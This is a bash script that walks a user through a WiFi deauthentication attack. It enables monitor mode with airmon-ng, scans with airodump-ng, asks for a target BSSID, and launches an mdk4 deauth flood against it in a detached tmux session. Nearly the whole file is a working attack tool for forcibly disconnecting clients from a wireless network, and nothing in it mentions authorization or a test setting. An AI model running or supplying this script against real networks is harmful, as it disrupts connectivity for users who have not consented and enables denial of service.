#!/bin/bash
echo -e ${green}"Which interface do you want to use to deauth?"${clear}
echo ""
read DEAUTH
echo ""
echo -e ${yellow}"Using $DEAUTH to deauth"${clear}
echo ""
sleep 1
echo -e ${green}"Launching Airodump"${clear}
echo ""
sleep 1
echo -e ${green}"Press CTRL C When Your BSSID Appears"${clear}
sleep 3
airmon-ng start $DEAUTH
airodump-ng $DEAUTH
echo ""
echo -e ${green}"Enter The BSSID To Deauth"${clear}
echo ""
read BSSID
echo ""
echo -e ${red}"Time To Deauth"${clear}
echo ""
sleep 2
echo -e ${red}"Press CTRL+B then press D to disconnect TMUX Session Once Deauth Is Started"${clear}
echo ""
sleep 2
read -p "Press enter once you understand how to disconnect from the TMUX session"
tmux new-session -s deauth "mdk4 $DEAUTH d -B $BSSID"
